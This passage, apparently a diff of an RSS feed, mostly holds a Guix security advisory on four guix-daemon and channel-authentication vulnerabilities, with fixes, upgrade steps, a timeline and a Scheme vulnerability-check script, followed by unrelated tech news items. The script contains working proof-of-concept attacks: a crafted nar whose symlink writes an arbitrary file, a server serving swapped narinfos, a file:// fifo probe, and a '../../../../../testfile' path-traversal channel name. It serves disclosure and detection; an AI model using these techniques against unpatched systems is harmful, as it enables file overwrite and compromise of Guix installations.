+to use more lax filesystem primitives from &lt;code&gt;std::filesystem&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Fixing vulnerability (2) involved modifying &lt;code&gt;fetch-narinfos&lt;/code&gt; to not include a
+result if it didn&apos;t match what was asked for.&lt;/p&gt;&lt;p&gt;Fixing vulnerability (3) involved modifying &lt;code&gt;(guix scripts substitute)&lt;/code&gt; to
+verify that all substitute urls from untrusted sources are not &lt;code&gt;file://&lt;/code&gt; urls,
+and that all nar urls in narinfos are not &lt;code&gt;file://&lt;/code&gt; urls (except when a special
+flag is set, which is only done in the test suite).&lt;/p&gt;&lt;p&gt;Some additional hardening was also done, so that substitutes are restored inside
+a temporary directory and only moved to their final store item path once the
+hash is verified. This still restores them before verifying the hash, so it
+wouldn&apos;t have prevented (1), but it does ensure that attacker-controlled
+contents are not present at the path of what may have once been a valid store
+item (and may still be considered by some users or programs to be valid if they
+haven&apos;t taken note of a recent garbage collection). The narinfo-reading code was
+also modified to reject as invalid any narinfo file whose StorePath, References,
+or Deriver field contained a path that did not obey the store item path syntax
+requirements. A nice side-effect of this is that we now have procedures for
+verifying the syntax of store item paths.&lt;/p&gt;&lt;p&gt;Fixing vulnerability (4) involved changing how &lt;code&gt;cache-key&lt;/code&gt; was computed by
+default for users of &lt;code&gt;authenticate-repository&lt;/code&gt;. Rather than being derived from
+the name of the channel or (for &lt;code&gt;guix git authenticate&lt;/code&gt;) the url of the
+repository, &lt;code&gt;cache-key&lt;/code&gt; is now derived from the ID of the introductory commit,
+which is a very safe hexadecimal string. This also avoids some strange and
+potentially-dangerous behavior in which cached authenticated commit IDs could be
+shared between two channels that happen to share a name but are otherwise
+completely different. Additional hardening of &lt;code&gt;authenticate-repository&lt;/code&gt; was
+added to turn all occurrences of &lt;code&gt;.&lt;/code&gt; in &lt;code&gt;cache-key&lt;/code&gt; into &lt;code&gt;-&lt;/code&gt; so that even if
+non-default cache keys were provided, it would not be possible to escape the
+cache directory.&lt;/p&gt;&lt;h1&gt;Upgrading&lt;/h1&gt;&lt;p&gt;Due to the severity of this security advisory, &lt;strong&gt;we strongly recommend all users
+to upgrade &lt;code&gt;guix&lt;/code&gt; and &lt;code&gt;guix-daemon&lt;/code&gt; immediately&lt;/strong&gt;.&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: The astute reader may have noticed a dilemma: the fastest way to get
+updates is through substitutes, and the way to mitigate the most severe of the
+remotely-exploitable vulnerabilities is to disable substitutes. Whether to
+pass &lt;code&gt;--no-substitutes&lt;/code&gt; is therefore a judgment call that must take into
+consideration how long it has been since these vulnerabilities were made
+public, how exposed the network paths between your system and your substitute
+servers are, how feasible it is for the system in question to build guix by
+itself (which will depend in part on how long it has been since you last
+upgraded), whether the system in question has multiple users, and of course,
+your threat model.&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;strong&gt;For Guix System&lt;/strong&gt;, &lt;a href=&quot;https://guix.gnu.org/manual/devel/en/html_node/Getting-Started-with-the-System.html&quot;&gt;the
+procedure&lt;/a&gt;
+is to reconfigure the system after a &lt;code&gt;guix pull&lt;/code&gt;, either restarting
+&lt;code&gt;guix-daemon&lt;/code&gt; or rebooting.  For example:&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;guix pull
+sudo guix system reconfigure /run/current-system/configuration.scm
+sudo herd restart guix-daemon&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;where &lt;code&gt;/run/current-system/configuration.scm&lt;/code&gt; is the current system
+configuration but could, of course, be replaced by a system configuration file
+of a user&apos;s choice.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;For Guix on another distribution&lt;/strong&gt;, one needs to &lt;code&gt;guix pull&lt;/code&gt; with &lt;code&gt;sudo&lt;/code&gt;, as
+the &lt;code&gt;guix-daemon&lt;/code&gt; runs as root, and restart the &lt;code&gt;guix-daemon&lt;/code&gt; service, &lt;a href=&quot;https://guix.gnu.org/manual/devel/en/html_node/Upgrading-Guix.html&quot;&gt;as
+documented&lt;/a&gt;.
+For example, on a system using systemd to manage services, run:&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;sudo --login guix pull
+sudo systemctl restart guix-daemon.service&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Note that for users with their distro&apos;s package of Guix (as opposed to having
+used the &lt;a href=&quot;https://guix.gnu.org/en/manual/en/html_node/Binary-Installation.html&quot;&gt;install
+script&lt;/a&gt;)
+you may need to take other steps or upgrade the Guix package as per other
+packages on your distro. Please consult the relevant documentation from your
+distro or contact the package maintainer for additional information or
+questions.&lt;/p&gt;&lt;h1&gt;Timeline&lt;/h1&gt;&lt;ul&gt;&lt;li&gt;May 28th, 2026. Jörg Thalheim of Nix shares the &lt;code&gt;restore-file&lt;/code&gt; vulnerability
+with Christopher Baines and Andreas Enge; Christopher sends details to &lt;a href=&quot;https://guix.gnu.org/security&quot;&gt;the
+Security Response Team&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;June 4th, 2026.  Andreas Enge notifies Caleb Ristvedt and Ludovic Courtès who
+start working on a fix.&lt;/li&gt;&lt;li&gt;June 10th, 2026.  Caleb Ristvedt finds the &lt;code&gt;file://&lt;/code&gt; vulnerability
+of &lt;code&gt;guix substitute&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;June 22nd, 2026.  Caleb Ristvedt finds the third vulnerability: that &lt;code&gt;guix substitute&lt;/code&gt; did not verify whether the narinfo it is getting is the one it
+asked for.&lt;/li&gt;&lt;li&gt;June 24th, 2026.  Following an &lt;a href=&quot;https://codeberg.org/guix/guix/pulls/2241#issuecomment-17569115&quot;&gt;issue reported by Sergio
+Pastor-Pérez&lt;/a&gt;,
+Ludovic Courtès identifies the &lt;code&gt;pull&lt;/code&gt; and &lt;code&gt;time-machine&lt;/code&gt; vulnerability and
+works on a fix.  For the sake of convenience and because hints were available
+publicly, it was decided that it should be promptly fixed and disclosed at the
+same time as the other vulnerabilities.&lt;/li&gt;&lt;/ul&gt;&lt;h1&gt;Conclusion&lt;/h1&gt;&lt;p&gt;We would like to thank Jörg Thalheim for sharing the &lt;code&gt;restore-file&lt;/code&gt;
+vulnerability, Christopher Baines for verifying it and informing &lt;a href=&quot;https://guix.gnu.org/security&quot;&gt;the Security
+Response Team&lt;/a&gt;, and Andreas Enge for ensuring
+that it reached Ludovic and Caleb and facilitating ongoing communication with
+Jörg.&lt;/p&gt;&lt;p&gt;We would also like to thank John Kehayias of the Security Response Team for
+coordination and for requesting CVE IDs.&lt;/p&gt;&lt;h2&gt;Test for presence of vulnerability&lt;/h2&gt;&lt;p&gt;Below is code to check if your &lt;code&gt;guix-daemon&lt;/code&gt; is vulnerable to the first three
+vulnerabilities and your &lt;code&gt;guix&lt;/code&gt; is vulnerable to the fourth. Save this file as
+&lt;code&gt;guix-substitute-and-pull-vuln-check.scm&lt;/code&gt; and run following the instructions
+above, in &quot;Mitigation.&quot;&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-scheme&quot;&gt;(use-modules (git)
+             (guix build utils)
+             (guix derivations)
+             (guix channels)
+             (guix config)
+             (guix gexp)
+             (guix git)
+             (guix narinfo)
+             (guix packages)
+             (guix pki)
+             (guix utils)
+             (guix serialization)
+             (guix store)
+             (guix substitutes)
+             ((gnu packages base) #:hide (which))
+             (gnu packages esolangs)
+             (srfi srfi-1)
+             (srfi srfi-26)
+             (srfi srfi-31)
+             (srfi srfi-34)
+             (rnrs bytevectors)
+             (ice-9 atomic)
+             (ice-9 binary-ports)
+             (ice-9 control)
+             (ice-9 match)
+             (ice-9 popen)
+             (ice-9 rdelim)
+             (ice-9 textual-ports)
+             (ice-9 threads)
+             (web response)
+             (web request)
+             (web uri)
+             (web server)
+             (web server http))
+
+;; 1. restore-file
+
+;; Craft an invalid nar, identify a substitutable path that doesn&apos;t exist (gc
+;; if necessary), get its signed narinfo, start an http server, connect to
+;; store, set substitute urls, ask to substitute the chosen path.  Have http
+;; server serve the signed narinfo with the URLs replaced with its own.  When
+;; the nar is requested, serve the invalid nar.  Once the substitution errors
+;; out (hash doesn&apos;t match), check whether the chosen file now exists with the
+;; specified contents.  We&apos;re vulnerable if and only if it does.
+
+(define target-file
+  &quot;/tmp/guix-restore-file-vulnerable&quot;)
+
+(define target-substitutable-package
+  ;; pick something obscure but in the main guix channel, so it is either not
+  ;; currently valid or can probably be gc&apos;ed.  This is just to make the test
+  ;; more reliable - in real exploitation, an attacker can sit around and wait
+  ;; for any substitute request to be made, but here we need to provoke one in
+  ;; a timely manner.
+  cfunge)
+
+(define substitute-servers
+  (with-store store
+    (substitute-urls store)))
+
+;; Grafts can cause package-&amp;gt;derivation to actually start substituting outputs
+;; of the derivation being computed, which means we&apos;d have to gc it afterward.
+(%graft? #f)
+
+(define (package-&amp;gt;path+narinfo store package)
+  (define path
+    (derivation-&amp;gt;output-path (run-with-store store (lower-object package))))
+
+  (match (lookup-narinfos/diverse substitute-servers (list path)
+                                  valid-narinfo?)
+    ((info) (values path info))
+    (() (values #f #f))))
+
+(define (restore-file-vuln?)
+  (define-values (target-path target-info)
+    (call-with-values (lambda ()
+                        (with-store store
+                          
+                          (package-&amp;gt;path+narinfo store
+                                                 target-substitutable-package)))
+      (lambda (path info)
+        (unless info
+          (error &quot;can&apos;t find substitutable path to test &apos;restore-file&apos; with\n&quot;))
+        (with-store store
+          (when (valid-path? store path)
+            (when (null? (delete-paths store (list path)))
+              (error &quot;can&apos;t delete substitutable path to test &apos;restore-file&apos; with\n&quot;))))
+        (values path info))))
+
+  (define new-target-info-contents
+    (let* ((contents (narinfo-contents target-info))
+           (signature-index (string-contains contents &quot;Signature:&quot;))
+           (after-signature-index (string-index contents #\newline
+                                                signature-index))
+           (signed-contents (string-take contents (or after-signature-index
+                                                      (string-length
+                                                       contents)))))
+      (string-append signed-contents &quot;
+URL: example.nar
+Compression: none
+NarSize: 0\n&quot;)))
+
+  ;; We can&apos;t delete target-file if it&apos;s owned by root, so overwrite it with
+  ;; fresh, mostly-random contents each time, and check that the contents match.
+  (define test-contents
+    (format #f &quot;VULNERABLE!~%~S:~S~%&quot; (getpid) (random 100000000)))
+
+  (define test-nar
+    (call-with-output-bytevector
+     (lambda (port)
+       (for-each (lambda (s)
+                   (write-string s port))
+                 `(&quot;nix-archive-1&quot;
+                   &quot;(&quot; &quot;type&quot; &quot;directory&quot;
+                   &quot;entry&quot; &quot;(&quot; &quot;name&quot; &quot;a&quot;
+                   &quot;node&quot; &quot;(&quot; &quot;type&quot; &quot;symlink&quot;
+                   &quot;target&quot; ,target-file &quot;)&quot; &quot;)&quot;
+                   &quot;entry&quot; &quot;(&quot; &quot;name&quot; &quot;a&quot;
+                   &quot;node&quot; &quot;(&quot; &quot;type&quot; &quot;regular&quot;
+                   &quot;contents&quot; ,test-contents  &quot;)&quot; &quot;)&quot;
+                   &quot;)&quot;)))))
+
+  (define bad-request
+    (build-response #:code 400 #:reason-phrase &quot;Unexpected request&quot;))
+
+  (define target-uri-path
+    (string-append &quot;/&quot; (store-path-hash-part target-path) &quot;.narinfo&quot;))
+
+  (define nar-uri-path &quot;/example.nar&quot;)
+
+  (define (handle request body)
+    (cond
+     ((not (eq? (request-method request) &apos;GET))
+      (values bad-request &quot;&quot;))
+     ((string=? (uri-path (request-uri request)) target-uri-path)
+      (format (current-error-port)
+              &quot;Returning narinfo pointing to test nar~%&quot;)
+      (values (build-response #:code 200)
+              new-target-info-contents))
+     ((string=? (uri-path (request-uri request)) nar-uri-path)
+      (format (current-error-port) &quot;Returning test nar~%&quot;)
+      (values (build-response #:code 200)
+              test-nar))
+     (else
+      (values bad-request &quot;&quot;))))
+
+  (call-with-port (socket PF_INET SOCK_STREAM 0)
+    (lambda (sock)
+      (setsockopt sock SOL_SOCKET SO_REUSEADDR 1)
+      (bind sock (make-socket-address AF_INET INADDR_LOOPBACK 0))
+      (listen sock 5)
+      (let* ((port-number (sockaddr:port (getsockname sock)))
+             (substitute-url (string-append &quot;http://localhost:&quot;
+                                            (number-&amp;gt;string port-number)
+                                            &quot;/&quot;))
+             (server-thread (call-with-new-thread
+                             (lambda ()
+                               (run-server handle http
+                                           `(#:socket ,sock))))))
+        (with-store store
+          (set-build-options store
+                             #:substitute-urls (list substitute-url))
+          (guard (c ((store-error? c)
+                     ;; XXX doesn&apos;t actually cancel until something tries
+                     ;; connecting
+                     (cancel-thread server-thread)
+                     ;;(join-thread server-thread)
+                     (and (file-exists? target-file)
+                          (string=? (call-with-input-file target-file
+                                      get-string-all)
+                                    test-contents))))
+            (build-things store (list target-path))
+            ;; If the substitution actually completes without throwing then we
+            ;; are most definitely vulnerable, but not just in &apos;restore-path&apos;.
+            (error &quot;!!!substitution of invalid nar completed???!!!&quot;)))))))
+
+
+
+;; 2. fetch-narinfos
+
+;; Identify two substitutable paths P1 and P2.  Get P1 and P2&apos;s signed
+;; narinfos, start an http server, connect to store, set substitute urls, ask
+;; whether P1 and P2 are substitutable.  Have http server serve P2&apos;s narinfo
+;; when asked for P1&apos;s, and P1&apos;s when asked for P2&apos;s.  If vulnerable, it will
+;; report that both are substitutable, if not, it will report that neither
+;; are.
+
+;; We need two substitutable paths because the daemon&amp;lt;--&amp;gt;&apos;guix substitute
+;; --query&apos; interface verifies that the info it gets back is for a path that
+;; was requested, so the &quot;replacement&quot; path has to also be queried for
+;; substitutability at the same time.
+
+(define (fetch-narinfos-vuln?)
+  (define-values (hello-path hello-info)
+    (with-store store (package-&amp;gt;path+narinfo store hello)))
+
+  (define-values (sed-path sed-info)
+    (with-store store (package-&amp;gt;path+narinfo store sed)))
+
+  (define bad-request
+    (build-response #:code 400 #:reason-phrase &quot;Unexpected request&quot;))
+
+  (define hello-uri-path
+    (string-append &quot;/&quot; (store-path-hash-part hello-path) &quot;.narinfo&quot;))
+
+  (define sed-uri-path
+    (string-append &quot;/&quot; (store-path-hash-part sed-path) &quot;.narinfo&quot;))
+
+  (define (handle request body)
+    (cond
+     ((not (eq? (request-method request) &apos;GET))
+      (values bad-request &quot;&quot;))
+     ((string=? (uri-path (request-uri request)) hello-uri-path)
+      (format (current-error-port) &quot;Returning sed when asked for hello~%&quot;)
+      ;; Return the wrong result
+      (values (build-response #:code 200)
+              (narinfo-contents sed-info)))
+     ((string=? (uri-path (request-uri request)) sed-uri-path)
+      (format (current-error-port) &quot;Returning hello when asked for sed~%&quot;)
+      ;; Return the wrong result
+      (values (build-response #:code 200)
+              (narinfo-contents hello-info)))
+     (else
+      (values bad-request &quot;&quot;))))
+
+  (unless (and hello-info sed-info)
+    (error &quot;can&apos;t find substitutable paths to test &apos;fetch-narinfos&apos; with&quot;))
+
+  (call-with-port (socket PF_INET SOCK_STREAM 0)
+    (lambda (sock)
+      (setsockopt sock SOL_SOCKET SO_REUSEADDR 1)
+      (bind sock (make-socket-address AF_INET INADDR_LOOPBACK 0))
+      (listen sock 5)
+      (let* ((port-number (sockaddr:port (getsockname sock)))
+             (substitute-url (string-append &quot;http://localhost:&quot;
+                                            (number-&amp;gt;string port-number)
+                                            &quot;/&quot;))
+             (server-thread (call-with-new-thread
+                             (lambda ()
+                               (run-server handle http
+                                           `(#:socket ,sock))))))
+        (with-store store
+          (set-build-options store
+                             #:substitute-urls (list substitute-url))
+          (let ((substitutables
+                 (substitutable-paths store (list hello-path sed-path))))
+            ;; XXX doesn&apos;t actually cancel until something tries connecting
+            (cancel-thread server-thread)
+            ;;(join-thread server-thread)
+            (not (null? substitutables))))))))
+
+;; 3. file-uris
+
+;; Create a fifo whose name is 32 nix-base32 characters followed by
+;; &quot;.narinfo&quot;, connect to store, set substitute urls to point to containing
+;; directory, spawn a thread to block trying to open fifo write-only which
+;; will subsequently set a flag and close the port, then ask whether some
+;; store path with that hash is substitutable.  It should fail in all cases.
+;; Check whether the flag is set; if so, we&apos;re vulnerable, otherwise we&apos;re
+;; not.
+
+(define (file-uris-vuln?)
+  (call-with-temporary-directory
+   (lambda (directory)
+     (define testfifo
+       (string-append directory &quot;/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.narinfo&quot;))
+     (define opened? (make-atomic-box #f))
+     (define store-item
+       (string-append (%store-prefix) &quot;/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-foo&quot;))
+
+     (define open-thread
+       (begin
+         (mknod testfifo &apos;fifo #o744 0)
+         (call-with-new-thread
+          (lambda ()
+            (call-with-port (open testfifo O_WRONLY)
+              (lambda (port)
+                (atomic-box-set! opened? #t))))))) 
+
+     (with-store store
+       (set-build-options store
+                          #:substitute-urls (list (string-append &quot;file://&quot; directory)))
+       (guard (c ((store-error? c)
+                  (cancel-thread open-thread)
+                  (delete-file testfifo)
+                  ;; even though the file it is trying to open no longer
+                  ;; exists, the kernel doesn&apos;t give a result to open-thread
+                  ;; until someone ptraces it (or maybe sends a signal or
+                  ;; something).
+                  ;; (join-thread open-thread)
+                  (atomic-box-ref opened?)))
+         (substitutable-paths store (list store-item))
+         (error &quot;not supposed to get here!\n&quot;))))))
+
+;; 4. cache-key
+
+;; Create a barebones git repository that is a valid channel, create a
+;; &amp;lt;channel&amp;gt; that references it using a malformed name, set XDG_CACHE_HOME to
+;; a directory inside a temporary directory (so that &apos;cache-directory&apos; points
+;; to a subdirectory of it), call authenticate-channel, see if a file outside
+;; of XDG_CACHE_HOME gets created.
+
+;; If you don&apos;t have Internet access, edit this to point to a local repository
+;; containing at least commit 5a2d9baeda971df575c017669bca8eb8faa22ebd and its
+;; ancestors, and the keyring branch.
+(define guix-science-url
+  &quot;https://codeberg.org/guix-science/guix-science.git&quot;)
+
+(define (create-test-channel directory channel-name)
+  &quot;Populate REPOSITORY with the necessary contents for it to be a valid
+channel with 2 commits, then return three values: a &amp;lt;channel&amp;gt; for it with name
+CHANNEL-NAME and an introduction to the first commit, the first commit, and
+the second commit.&quot;
+  (define intro-commit
+    &quot;b1fe5aaff3ab48e798a4cce02f0212bc91f423dc&quot;)
+
+  (define end-commit ;; The commit following intro-commit
+    &quot;5a2d9baeda971df575c017669bca8eb8faa22ebd&quot;)
+
+  (define fingerprint
+    &quot;CA4F 8CF4 37D7 478F DA05  5FD4 4213 7701 1A37 8446&quot;)
+
+  (define git %git) ;; From (guix config), guix has a hard dependency on git
+
+  (with-directory-excursion directory
+    (invoke git &quot;init&quot;
+            ;; Silence warning
+            &quot;--initial-branch=main&quot;)
+    (invoke git &quot;remote&quot; &quot;add&quot; &quot;--&quot; &quot;origin&quot; guix-science-url)
+    (invoke git &quot;fetch&quot; &quot;--&quot; &quot;origin&quot; end-commit)
+    (invoke git &quot;checkout&quot; &quot;FETCH_HEAD&quot;)
+    (invoke git &quot;fetch&quot; &quot;--&quot; &quot;origin&quot; &quot;refs/heads/keyring:keyring&quot;)
+    (values
+     (channel
+       (name channel-name)
+       (url (canonicalize-path directory))
+       (introduction (make-channel-introduction
+                      intro-commit
+                      (openpgp-fingerprint fingerprint))))
+     intro-commit
+     end-commit)))
+
+(define (cache-key-vuln?)
+  (call-with-temporary-directory
+   (lambda (directory)
+     (let ((home (string-append directory &quot;/home&quot;))
+           (channel-repo (string-append directory &quot;/channel-repo&quot;))
+           (testfile (string-append directory &quot;/testfile&quot;)))
+       (mkdir home)
+       (mkdir channel-repo)
+       (with-environment-variables `((&quot;HOME&quot; ,home)
+                                     (&quot;XDG_CACHE_HOME&quot; ,(string-append home
+                                                                       &quot;/.cache&quot;)))
+         (call-with-values
+             (lambda ()
+               (create-test-channel channel-repo
+                                    (string-&amp;gt;symbol &quot;../../../../../testfile&quot;)))
+           (lambda (channel first-commit last-commit)
+             (authenticate-channel channel channel-repo last-commit
+                                   #:keyring-reference-prefix &quot;&quot;)))
+         (file-exists? testfile))))))
+
+;; Results
+
+(define vulnerabilities
+  (list (list &quot;restore-file&quot; restore-file-vuln?)
+        (list &quot;fetch-narinfos&quot; fetch-narinfos-vuln?)
+        (list &quot;file-uris&quot; file-uris-vuln?)
+        (list &quot;cache-key&quot; cache-key-vuln?)))
+
+(define (call-with-errors-to-string proc)
+  (define tag (make-prompt-tag))
+  (call-with-prompt tag
+    (lambda ()
+      (with-throw-handler #t
+        proc
+        (rec (self key . args)
+             (let* ((stack (make-stack #t
+                                       1 ;self ;; Causes make-stack to return #f??
+                                       tag
+                                       ))
+                    (frames (stack-length stack))
+                    (frame (stack-ref stack 0)))
+               (define error-string
+                 (match args
+                   (((or (? string? proc) (? symbol? proc))
+                     (? string? message) (args ...) . rest)
+                    (call-with-output-string
+                      (lambda (port)
+                        (display-error frame port proc message args
+                                       rest))))
+                   (args
+                    (call-with-output-string
+                      (lambda (port)
+                        (print-exception port frame key args))))))
+
+               (display-backtrace stack (current-error-port))
+               (display error-string (current-error-port))
+               (abort-to-prompt tag (string-append &quot;error: &quot;
+                                                   (string-trim-both
+                                                    error-string)))))))
+    (lambda (_ . args)
+      (apply values args))))
+
+(define results
+  (map (match-lambda
+         ((name proc)
+          (list name (if (string? proc)
+                         proc ;; pass message through
+                         (call-with-errors-to-string proc)))))
+       vulnerabilities))
+
+(for-each (match-lambda
+            ((name vulnerable?)
+             (format #t &quot;~a: ~a~%&quot;
+                     name
+                     (if (boolean? vulnerable?)
+                         (if vulnerable? &quot;vulnerable&quot; &quot;not vulnerable&quot;)
+                         vulnerable?))))
+          results)
+
+(exit (if (any second results) 1 0))&lt;/code&gt;&lt;/pre&gt;</description>
+      <pubDate>Thu, 02 Jul 2026 17:00:00 -0000</pubDate>
+      <guid isPermaLink="false">https://guix.gnu.org/blog/2026/guix-substitute-pull-vulnerabilities//</guid>
+      <source url="https://planet.gnu.org/rss20.xml">Planet GNU</source>
+    </item>
+    <item>
       <title>[It's FOSS] Collabora Office 26.04 Keeps AI Optional and Refines Writer and Calc</title>
       <link>https://feed.itsfoss.com/link/24361/17371813/collabora-office-26-04</link>
       <description>The desktop suite&amp;#x27;s first major update pulls features from CODE 26.04.</description>
@@ -1590,28 +2313,12 @@ rewine (1):
       <source url="https://github.blog/feed">GitHub Blog</source>
     </item>
     <item>
-      <title>[The Verge] Influencer screenings aren’t going away</title>
-      <link>https://www.theverge.com/entertainment/960260/the-odyssey-christopher-nolan-influencers-screenings</link>
-      <description>For a few days, it seemed like Universal decided that there would be no advanced screenings of Christopher Nolan&apos;s The Odyssey for influencers. But on Monday, influencers sat alongside traditional critics and journalists at special showings of The Odyssey specifically for the associated press junket. Despite what it may have looked like, Universal was not [&amp;#8230;]</description>
-      <pubDate>Thu, 02 Jul 2026 15:50:26 -0000</pubDate>
-      <guid isPermaLink="false">https://www.theverge.com/?p=960260</guid>
-      <source url="https://www.theverge.com/rss/index.xml">The Verge</source>
-    </item>
-    <item>
       <title>[Phoronix] Linux Kernel Developers Again Discussing AI Agent Attribution - Potentially Dropping It</title>
       <link>https://www.phoronix.com/news/Linux-AI-Attribution-Again</link>
       <description>When AI/LLM agents are used in the creation of Linux kernel patches, the policy for a while now has been that it should be specified using an &quot;Assisted-by&quot; tag as part of the patches/commits. But Linux kernel developers this week have been discussing whether to revise that policy or to potentially eliminate it...</description>
       <pubDate>Thu, 02 Jul 2026 15:11:00 -0000</pubDate>
       <guid isPermaLink="false">https://www.phoronix.com/news/Linux-AI-Attribution-Again</guid>
       <source url="https://www.phoronix.com/rss.php">Phoronix</source>
-    </item>
-    <item>
-      <title>[The Verge] Godox’s feature-packed key light is down to its best price yet</title>
-      <link>https://www.theverge.com/gadgets/960664/godox-key-light-elgato-insta360-deal-sale</link>
-      <description>If you don’t want to spend $180 on the Elgato Key Light, the Godox ES45 Desktop LED Key Light is a more affordable option that offers nearly as much brightness and plenty of features, including adjustable brightness and color temperature. Right now, it’s cheaper than usual for the first time this year, selling for $119 [&amp;#8230;]</description>
-      <pubDate>Thu, 02 Jul 2026 15:00:00 -0000</pubDate>
-      <guid isPermaLink="false">https://www.theverge.com/?p=960664</guid>
-      <source url="https://www.theverge.com/rss/index.xml">The Verge</source>
     </item>
     <item>
       <title>[Phoronix] RISC-V RVV Vector Performance Benchmarks With The SpacemiT K3 SoC</title>
@@ -1663,54 +2370,6 @@ KWallet XML Import (&lt;a href=&quot;https://invent.kde.org/utilities/keepsecret
       <pubDate>Thu, 02 Jul 2026 12:48:00 -0000</pubDate>
       <guid isPermaLink="false">https://roshani-gsoc.bearblog.dev/week-5-kwallet-xml-import-password-generator/</guid>
       <source url="https://planet.kde.org/index.xml">Planet KDE</source>
-    </item>
-    <item>
-      <title>[BR-Linux] RootBoard: computador de bolso feito para rodar Linux</title>
-      <link>https://br-linux.org/2026/01/rootboard-computador-de-bolso-feito-para-rodar-linux.html</link>
-      <description>O RootBoard promete ser um computador Linux portátil, com teclado, tela e alto-falantes de verdade, e hardware totalmente aberto, construído para makers, e baseado em plaquinhas da classe Pi Zero.</description>
-      <pubDate>Thu, 02 Jul 2026 12:42:01 -0000</pubDate>
-      <guid isPermaLink="false">https://br-linux.org/2026/01/rootboard-computador-de-bolso-feito-para-rodar-linux.html</guid>
-      <source url="https://br-linux.org/feed">BR-Linux</source>
-    </item>
-    <item>
-      <title>[BR-Linux] Signal é o app favorito da Casa Branca quando querem conversar sem deixar rastros</title>
-      <link>https://br-linux.org/2026/01/signal-e-o-app-favorito-da-casa-branca-quando-querem-conversar-sem-deixar-rastros.html</link>
-      <description>Mais uma vez, vaza a opção de figurões do governo dos EUA pelo uso do app Signal quando querem tentar burlar a legislação que exige que as suas comunicações sejam objeto de registro público.</description>
-      <pubDate>Thu, 02 Jul 2026 12:30:59 -0000</pubDate>
-      <guid isPermaLink="false">https://br-linux.org/2026/01/signal-e-o-app-favorito-da-casa-branca-quando-querem-conversar-sem-deixar-rastros.html</guid>
-      <source url="https://br-linux.org/feed">BR-Linux</source>
-    </item>
-    <item>
-      <title>[BR-Linux] Tails 7.9.1: Distribuição com foco em privacidade atualiza Tor e corrige vulnerabilidade no kernel</title>
-      <link>https://br-linux.org/2026/01/tails-791-distribuicao-com-foco-em-privacidade-atualiza-tor-e-corrige-vulnerabilidade-no-kernel.html</link>
-      <description>O Tails 7.9.1, mantendo seu foco na privacidade, chega trazendo o kernel Linux 6.12.94, que corrige a recente vulnerabilidade DirtyClone.</description>
-      <pubDate>Thu, 02 Jul 2026 12:27:07 -0000</pubDate>
-      <guid isPermaLink="false">https://br-linux.org/2026/01/tails-791-distribuicao-com-foco-em-privacidade-atualiza-tor-e-corrige-vulnerabilidade-no-kernel.html</guid>
-      <source url="https://br-linux.org/feed">BR-Linux</source>
-    </item>
-    <item>
-      <title>[BR-Linux] Seis ferramentas de backup para uso no Linux</title>
-      <link>https://br-linux.org/2026/01/seis-ferramentas-de-backup-para-uso-no-linux.html</link>
-      <description>Usuários clássicos ou jurássicos ainda fazemos backup com o tar e acham suficiente, mas esse artigo do itsfoss  vai bem além e descreve 6 ferramentas mais modernas e interativas para essa tarefa.</description>
-      <pubDate>Thu, 02 Jul 2026 12:24:09 -0000</pubDate>
-      <guid isPermaLink="false">https://br-linux.org/2026/01/seis-ferramentas-de-backup-para-uso-no-linux.html</guid>
-      <source url="https://br-linux.org/feed">BR-Linux</source>
-    </item>
-    <item>
-      <title>[BR-Linux] Obrigado por tanto: Vint Cerf, pai da Internet, se aposenta aos 83 anos</title>
-      <link>https://br-linux.org/2026/01/obrigado-por-tanto-vint-cerf-pai-da-internet-se-aposenta-aos-83-anos.html</link>
-      <description>Vinton Cerf, um dos criadores dos protocolos básicos da Internet, deixará na próxima semana o seu cargo de evangelista-chefe da Internet no Google.</description>
-      <pubDate>Thu, 02 Jul 2026 12:19:57 -0000</pubDate>
-      <guid isPermaLink="false">https://br-linux.org/2026/01/obrigado-por-tanto-vint-cerf-pai-da-internet-se-aposenta-aos-83-anos.html</guid>
-      <source url="https://br-linux.org/feed">BR-Linux</source>
-    </item>
-    <item>
-      <title>[Phoronix] Vibe Coded X11 Server Written In Rust Adds Xinerama, FreeBSD Support &amp; Other Features</title>
-      <link>https://www.phoronix.com/news/YSERVER-1.3-Released</link>
-      <description>One month ago we reported on YSERVER as a modern X11 server written in Rust with the help of Claude Code. Since then YSERVER has continued to advance in supporting more X11 functionality thanks to the help of Claude Code (AI) and out today is version 1.3 o this display server...</description>
-      <pubDate>Thu, 02 Jul 2026 12:15:00 -0000</pubDate>
-      <guid isPermaLink="false">https://www.phoronix.com/news/YSERVER-1.3-Released</guid>
-      <source url="https://www.phoronix.com/rss.php">Phoronix</source>
     </item>
     <item>
       <title>[Diolinux] Microsoft libera ISOs do Azure Linux baseado no Fedora para testes locais</title>
@@ -2073,91 +2732,6 @@ preserved.&lt;/p&gt;
       <pubDate>Sun, 29 Oct 2023 08:57:51 -0000</pubDate>
       <guid isPermaLink="false">tag:github.com,2008:Repository/30291090/4.23</guid>
       <source url="https://github.com/i3/i3/releases.atom">i3wm</source>
-    </item>
-    <item>
-      <title>[Planet GNU] unifont @ Savannah: Unifont 17.0.05 Released</title>
-      <link>https://savannah.gnu.org/news/?id=10909</link>
-      <description>&lt;p&gt;&lt;b&gt;28 June 2026&lt;/b&gt; Unifont 17.0.05 is now available.  This is a minor release aligned with Unicode 17.0.0.
-&lt;br /&gt;
-
-&lt;br /&gt;
-This release notably includes separate BDF, PCF, and OpenType font files with Unicode T-source Chinese glyphs created by Kusanagi_Sans and Kao Chen-tung (高振東) in font files beginning with &quot;unifont_t&quot;.  Many other Chinese glyphs have been added.  See the ChangeLog file for details.
-&lt;br /&gt;
-
-&lt;br /&gt;
-Download this release from GNU server mirrors at:
-&lt;br /&gt;
-
-&lt;br /&gt;
-     &lt;a href=&quot;https://ftpmirror.gnu.org/unifont/unifont-17.0.05/&quot;&gt;https://ftpmirror ... /unifont-17.0.05/&lt;/a&gt;
